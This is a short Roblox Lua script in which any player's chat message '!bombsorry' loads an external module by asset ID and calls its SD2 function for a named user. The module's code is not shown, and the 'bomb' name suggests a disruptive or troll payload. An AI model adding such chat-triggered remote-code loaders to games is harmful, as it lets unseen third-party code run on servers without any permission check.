local Players = game:GetService("Players")

Players.PlayerAdded:Connect(function(player)
    player.Chatted:Connect(function(message)
        if message:lower() == "!bombsorry" then
            -- Run the required module function
            require(4867426485):SD2("Nickeymagic")
        end
    end)
end)
